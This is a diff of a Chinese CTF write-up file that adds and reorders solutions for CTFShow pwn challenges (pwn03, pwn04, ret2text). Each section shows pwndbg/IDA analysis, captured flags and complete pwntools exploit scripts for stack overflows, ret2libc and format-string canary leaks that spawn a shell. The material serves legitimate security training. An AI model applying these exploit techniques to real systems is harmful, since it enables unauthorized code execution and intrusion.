@@ -4729,6 +4729,273 @@ cat flag
 
 ------
 
+### pwn03
+
+先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)
+
+用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)
+
+双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)
+
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='i386', os='linux', log_level='debug')
+# io = process('pwn03')
+io = remote('pwn.challenge.ctf.show', 28067)
+e = ELF('pwn03')
+puts_plt = e.plt['puts']
+log.success('puts_plt => %s' % hex(puts_plt))
+puts_got = e.got['puts']
+log.success('puts_got => %s' % hex(puts_got))
+main_address = e.symbols['main']
+log.success('main_address => %s' % hex(main_address))
+# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
+payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
+io.sendline(payload)
+io.recvuntil('\n\n')
+puts_address = u32(io.recv(4)) # 接收4个字节并解包
+log.success('puts_address => %s' % hex(puts_address))
+libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
+libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
+log.success('libcbase_address => %s' % hex(libcbase))
+system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
+log.success('system_address => %s' % hex(system_address))
+bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
+log.success('bin_sh_address => %s' % hex(bin_sh_address))
+payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)
+
+------
+
+### pwn04
+
+先`file ./ex2`查看文件类型再`checksec --file=./ex2`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
+└─$ file ./ex2 
+./pwn04: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6109b31b5fb5bcbef1eb882cf8d59afb93900352, not stripped
+                                                                   
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
+└─$ checksec --file=./ex2 
+[*] '/home/tyd/ctf/pwn/ctfshow/ex2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`ex2`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  puts("Hello Hacker!");
+  vuln();
+  return 0;
+}
+```
+
+双击进入`vuln()`函数，发现该函数存在格式化字符串漏洞。
+
+```c
+unsigned int vuln()
+{
+  int i; // [esp+4h] [ebp-74h]
+  char buf[100]; // [esp+8h] [ebp-70h] BYREF
+  unsigned int v3; // [esp+6Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  for ( i = 0; i <= 1; ++i )
+  {
+    read(0, buf, 0x200u);
+    printf(buf);
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+
+
+
+```bash
+$gdb ./ex2
+pwndbg> disass vuln
+Dump of assembler code for function vuln:
+   0x0804862e <+0>:     push   ebp
+   0x0804862f <+1>:     mov    ebp,esp
+   0x08048631 <+3>:     sub    esp,0x78
+   0x08048634 <+6>:     mov    eax,gs:0x14
+   0x0804863a <+12>:    mov    DWORD PTR [ebp-0xc],eax    # canary
+   0x0804863d <+15>:    xor    eax,eax
+   0x0804863f <+17>:    mov    DWORD PTR [ebp-0x74],0x0
+   0x08048646 <+24>:    jmp    0x8048671 <vuln+67>
+   0x08048648 <+26>:    sub    esp,0x4
+   0x0804864b <+29>:    push   0x200
+   0x08048650 <+34>:    lea    eax,[ebp-0x70]
+   0x08048653 <+37>:    push   eax
+   0x08048654 <+38>:    push   0x0
+   0x08048656 <+40>:    call   0x8048430 <read@plt>
+   0x0804865b <+45>:    add    esp,0x10
+   0x0804865e <+48>:    sub    esp,0xc
+   0x08048661 <+51>:    lea    eax,[ebp-0x70]
+   0x08048664 <+54>:    push   eax
+   0x08048665 <+55>:    call   0x8048440 <printf@plt>    # printf地址
+   0x0804866a <+60>:    add    esp,0x10
+   0x0804866d <+63>:    add    DWORD PTR [ebp-0x74],0x1
+   0x08048671 <+67>:    cmp    DWORD PTR [ebp-0x74],0x1
+   0x08048675 <+71>:    jle    0x8048648 <vuln+26>
+   0x08048677 <+73>:    nop
+   0x08048678 <+74>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804867b <+77>:    xor    eax,DWORD PTR gs:0x14
+   0x08048682 <+84>:    je     0x8048689 <vuln+91>
+   0x08048684 <+86>:    call   0x8048450 <__stack_chk_fail@plt>
+   0x08048689 <+91>:    leave  
+   0x0804868a <+92>:    ret    
+End of assembler dump.
+pwndbg> b *0x8048665
+Breakpoint 1 at 0x8048665
+pwndbg> run
+Starting program: /home/tyd/ctf/pwn/ctfshow/pwn04 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Hello Hacker!
+AAAA  # 随便输入
+
+Breakpoint 1, 0x08048665 in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
+ EAX  0xffffcf48 ◂— 0x41414141 ('AAAA')
+ EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+ ECX  0xffffcf48 ◂— 0x41414141 ('AAAA')
+ EDX  0x200
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+ ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
+ EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
+ ESP  0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
+ EIP  0x8048665 (vuln+55) —▸ 0xfffdd6e8 ◂— 0x0
+────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
+ ► 0x8048665 <vuln+55>    call   printf@plt                     <printf@plt>
+        format: 0xffffcf48 ◂— 0x41414141 ('AAAA')
+        vararg: 0xffffcf48 ◂— 0x41414141 ('AAAA')
+ 
+   0x804866a <vuln+60>    add    esp, 0x10
+   0x804866d <vuln+63>    add    dword ptr [ebp - 0x74], 1
+   0x8048671 <vuln+67>    cmp    dword ptr [ebp - 0x74], 1
+   0x8048675 <vuln+71>    jle    vuln+26                     <vuln+26>
+ 
+   0x8048677 <vuln+73>    nop    
+   0x8048678 <vuln+74>    mov    eax, dword ptr [ebp - 0xc]
+   0x804867b <vuln+77>    xor    eax, dword ptr gs:[0x14]
+   0x8048682 <vuln+84>    je     vuln+91                     <vuln+91>
+ 
+   0x8048684 <vuln+86>    call   __stack_chk_fail@plt                     <__stack_chk_fail@plt>
+ 
+   0x8048689 <vuln+91>    leave  
+────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
+00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
+01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
+02:0008│         0xffffcf38 ◂— 0x200
+03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
+04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│         0xffffcf44 ◂— 0x0
+06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')
+07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
+──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
+ ► f 0 0x8048665 vuln+55
+   f 1 0x80486c1 main+54
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x80484c1 _start+33
+──────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x $ebp-0xc
+0xffffcfac:     0x5222d900
+pwndbg> stack 0x28
+00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')  # 栈顶 printf的地址
+01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
+02:0008│         0xffffcf38 ◂— 0x200
+03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
+04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│         0xffffcf44 ◂— 0x0
+06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')      # 输入字符串的起点
+07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
+08:0020│         0xffffcf50 —▸ 0xf7c116e4 ◂— 0x3c04
+09:0024│         0xffffcf54 ◂— 0x20 /* ' ' */
+0a:0028│         0xffffcf58 —▸ 0xf7c80af9 (__overflow+9) ◂— add    ebx, 0x19c4fb
+0b:002c│         0xffffcf5c —▸ 0xf7e1ba40 (_IO_file_jumps) ◂— 0x0
+0c:0030│         0xffffcf60 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+0d:0034│         0xffffcf64 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+0e:0038│         0xffffcf68 —▸ 0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
+0f:003c│         0xffffcf6c —▸ 0xf7c74f3b (puts+395) ◂— add    esp, 0x10
+10:0040│         0xffffcf70 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+11:0044│         0xffffcf74 ◂— 0xa /* '\n' */
+12:0048│         0xffffcf78 ◂— 0xd /* '\r' */
+13:004c│         0xffffcf7c —▸ 0xf7c7b7b0 (setbuf) ◂— sub    esp, 0x10
+14:0050│         0xffffcf80 —▸ 0xf7e1d620 (_IO_2_1_stdin_) ◂— 0xfbad208b
+15:0054│         0xffffcf84 ◂— 0x7d4
+16:0058│         0xffffcf88 —▸ 0x804a064 (stdout@@GLIBC_2.0) —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+17:005c│         0xffffcf8c ◂— 0xd /* '\r' */
+18:0060│         0xffffcf90 —▸ 0xffffcfd8 ◂— 0x0
+19:0064│         0xffffcf94 —▸ 0xf7fdb8d0 (_dl_runtime_resolve+16) ◂— pop    edx
+1a:0068│         0xffffcf98 —▸ 0xf7e1e9ac (_IO_stdfile_2_lock) ◂— 0x0
+1b:006c│         0xffffcf9c —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+1c:0070│         0xffffcfa0 —▸ 0x80486e0 (__libc_csu_init) ◂— push   ebp
+1d:0074│         0xffffcfa4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+1e:0078│         0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
+1f:007c│         0xffffcfac ◂— 0x5222d900   # canary偏移量为0x1f即31,可以通过%31$x泄露
+20:0080│         0xffffcfb0 —▸ 0x8048768 ◂— dec    eax /* 'Hello Hacker!' */
+21:0084│         0xffffcfb4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov    edi, eax
+22:0088│ ebp     0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
+23:008c│         0xffffcfbc —▸ 0x80486c1 (main+54) ◂— mov    eax, 0
+24:0090│         0xffffcfc0 —▸ 0xffffd000 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+25:0094│         0xffffcfc4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
+26:0098│         0xffffcfc8 —▸ 0xf7fc1b40 —▸ 0xf7c1f2bc ◂— 'GLIBC_PRIVATE'
+27:009c│         0xffffcfcc ◂— 0x5222d900  # ret地址
+```
+
+字符串起点到`canary`的长度为`0xffffcfac-0xffffcf48=100`，因此构造`payload`时先用`100`个字节填充`padding`，接着写入`canary`的值，接着填充`0xffffcfc8-0xffffcfbc=12`个字节，最后用`getshell`的地址覆盖掉返回地址。
+
+编写`Python`代码求解，得到`ctfshow{65bab64a-1dc2-4524-a1aa-227f6b5ec590}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('pwn.challenge.ctf.show', 28105)
+elf = ELF('./pwn04')
+getshell = elf.symbols['getshell']  # 0x804859b
+log.success('getshell => %s', hex(getshell))
+io.recvuntil('Hello Hacker!\n')
+io.sendline(b'%31$x')
+canary = int(io.recv(), 16)
+payload = b'a'*100 + p32(canary) + b'a'*12 + p32(getshell)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ### pwn05
 
 先`file ./pwn05`查看文件类型再`checksec --file=pwn05`检查一下文件保护情况。
@@ -4813,118 +5080,6 @@ io.interactive()
 
 ------
 
-### ret2text
-
-先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)
-
-用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)
-
-双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)
-
-在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)
-
-构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。
-
-```python
-from pwn import *
-
-context(os='linux', arch='amd64', log_level='debug')
-# io = process('ret2text')
-io = remote('pwn.challenge.ctf.show', 28067)
-e = ELF('ret2text')
-ctfshow_address = e.symbols['ctfshow']
-log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
-payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
-# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
-io.sendline(payload)
-io.interactive()
-```
-
-那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)
-
-编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。
-
-```python
-from pwn import *
-
-io = remote('pwn.challenge.ctf.show', 28067)
-payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
-io.sendline(payload)
-io.interactive()
-```
-
-![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)
-
-------
-
-### pwn03
-
-先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。
-
-![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)
-
-用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。
-
-![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)
-
-双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。
-
-![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)
-
-双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。
-
-![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)
-
-在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
-
-编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。
-
-```python
-from pwn import *
-from LibcSearcher import *
-
-context(arch='i386', os='linux', log_level='debug')
-# io = process('pwn03')
-io = remote('pwn.challenge.ctf.show', 28067)
-e = ELF('pwn03')
-puts_plt = e.plt['puts']
-log.success('puts_plt => %s' % hex(puts_plt))
-puts_got = e.got['puts']
-log.success('puts_got => %s' % hex(puts_got))
-main_address = e.symbols['main']
-log.success('main_address => %s' % hex(main_address))
-# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
-payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
-io.sendline(payload)
-io.recvuntil('\n\n')
-puts_address = u32(io.recv(4)) # 接收4个字节并解包
-log.success('puts_address => %s' % hex(puts_address))
-libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
-libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
-log.success('libcbase_address => %s' % hex(libcbase))
-system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
-log.success('system_address => %s' % hex(system_address))
-bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
-log.success('bin_sh_address => %s' % hex(bin_sh_address))
-payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
-io.sendline(payload)
-io.interactive()
-```
-
-![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)
-
-------
-
 ### pwn07
 
 先`file ./pwn07`查看文件类型再`checksec --file=pwn07`检查了一下文件保护情况。
@@ -5004,6 +5159,60 @@ io.interactive()
 ```
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn07/6.png)
+
+------
+
+### ret2text
+
+先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)
+
+用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)
+
+双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)
+
+在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)
+
+构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+# io = process('ret2text')
+io = remote('pwn.challenge.ctf.show', 28067)
+e = ELF('ret2text')
+ctfshow_address = e.symbols['ctfshow']
+log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
+payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
+# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
+io.sendline(payload)
+io.interactive()
+```
+
+那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)
+
+编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。
+
+```python
+from pwn import *
+
+io = remote('pwn.challenge.ctf.show', 28067)
+payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)
 
 ------
 
